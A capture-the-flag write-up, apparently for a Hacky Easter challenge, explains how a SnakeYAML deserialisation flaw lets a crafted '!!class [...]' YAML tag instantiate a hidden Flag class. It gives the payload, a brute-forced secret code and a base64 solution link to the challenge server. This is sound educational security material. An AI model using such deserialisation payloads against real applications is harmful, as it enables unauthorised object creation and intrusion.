# solution

## analyze code given
- `Flag` class is a subclass of `Image`
- `Flag` constructor takes a `Code` instance
- `Code` constructor takes a `short`
- `Code` has a method `isCorrect()`:
  - `if (code > 0 && code < 500 && code == SnakeService.getSecretCode()) ...`
- SnakeYml is used to parse the input strings (*art* parameter)
  - `import org.yaml.snakeyaml.Yaml;`

## exploit
- SnakeYaml deserialisation vulnerability
    - instances of classes are created when passing a value like the following, in the YAML:
    - `!!my.class.Name ['param-for-constructor']`

- analyze the samples (base64 decode)
    ```
    bmFtZTogU25ha2VzIGF0IHRoZSBCZWFjaAppbWFnZTogc25ha2VzX2F0X3RoZV9iZWFjaApzb3VyY2U6IERBTEwtRQpyZXNvbHV0aW9uOiAyNTZ4MjU2
    ```
    decodes to
    ```
    name: Snakes at the Beach
    image: snakes_at_the_beach
    source: DALL-E
    resolution: 256x256
    ```

- idea: use vulnerability to make a `Flag` instance instantiate, instead of a normal `Image` instance -> `Flag` is a subclass of `Image`

- `image: !!com.hackyeaster.digitalsnakeart.Flag [ ... ]`

- constructor takes a `Code`, which takes a `short`, so the full injection looks like:
    ```
    name: flag
    image: !!com.hackyeaster.digitalsnakeart.Flag [!!com.hackyeaster.digitalsnakeart.Code [123]]
    ```

- the secret code must be brute-forced (range 1..499), scripting is required

- solution: code 198
    ```
    name: Flag
    image: !!com.hackyeaster.digitalsnakeart.Flag [!!com.hackyeaster.digitalsnakeart.Code [198]]
    ```

- `[Solution](http://ch.hackyeaster.com:2307/art?art=bmFtZTogRmxhZwppbWFnZTogISFjb20uaGFja3llYXN0ZXIuZGlnaXRhbHNuYWtlYXJ0LkZsYWcgWyEhY29tLmhhY2t5ZWFzdGVyLmRpZ2l0YWxzbmFrZWFydC5Db2RlIFsxOThdXQ==)`


# build
- see `src/rebuild.sh`